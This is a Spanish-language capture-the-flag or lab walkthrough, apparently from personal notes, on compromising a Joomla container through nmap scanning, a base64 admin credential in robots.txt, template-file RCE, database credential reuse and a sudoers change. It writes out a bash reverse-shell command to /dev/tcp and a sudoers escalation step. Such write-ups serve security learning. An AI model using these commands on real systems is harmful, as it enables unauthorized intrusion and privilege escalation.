tags: #fuzzing #rce #sudo 
____
## Reconocimiento

Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
```bash
nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.3
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Anexos/Pasted image 20251027014747.png]]

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV --min-rate 5000 -vvv -n -Pn -p22,80 -vvv -oN version 172.17.0.2
```

![[Anexos/Pasted image 20251027014758.png]]

No encontramos nada interesante, así que vamos a echar un vistazo al servicio web:

![[Anexos/Pasted image 20251027032821.png]]

Hacemos fuzzing, y entre otras cosas, nos encontramos con un robots.txt:

![[Anexos/Pasted image 20251027032922.png]]


![[Anexos/Pasted image 20251027032707.png]]

Encontramos una credencial de admin:

```
admin:c2FubHVpczEyMzQ1
```

No podemos acceder ni hacer nada con la contraseña, así que podemos probar cosas, como decodificarla en base 64 y obtener la contraseña real:

```bash
echo "c2FubHVpczEyMzQ1" | base64 -d
```

![[Anexos/Pasted image 20251027034105.png]]

![[Anexos/Pasted image 20251027045946.png]]

![[Anexos/Pasted image 20251027050118.png]]

Tenemos una RCE gracias a incorporar ese código php en el archivo error.php. Ahora vamos a ejecutar lo siguiente para lograr una reverse shell:

```bash
http://172.17.0.3/templates/cassiopeia/error.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.70.86/443 0>%261"
```

![[Anexos/Pasted image 20251027050816.png]]

Vemos también que en el directorio home está el usuario luisillo.

Inspeccionando joomla, veo lo siguiente en el archivo de configuración:

![[Anexos/Pasted image 20251027052059.png]]

Probamos lo siguiente:

```bash 
mysql -u joomla_user -h localhost -p
```

![[Anexos/Pasted image 20251027052305.png]]

![[Anexos/Pasted image 20251027052343.png]]

![[Anexos/Pasted image 20251027053508.png]]

```bash
$2y$10$f/d0sy442VzLXyaUhSmmOu.FBRYed2afncJFmYkuJwRwsJQoaGYbW
```

Esta contraseña no hemos podido ni crackearla ni acceder con ella, así que seguimos buscando. En este caso, archivos que pertenezcan a luisillo:

```bash
find / -user luisillo 2>/dev/null
```

![[Anexos/Pasted image 20251027063031.png]]

![[Anexos/Pasted image 20251027063120.png]]


![[Anexos/Pasted image 20251027062947.png]]

![[Anexos/Pasted image 20251027063322.png]]

Vamos a añadir a luisillo al fichero sudoers con todos los permisos:

![[Anexos/Pasted image 20251027070006.png]]


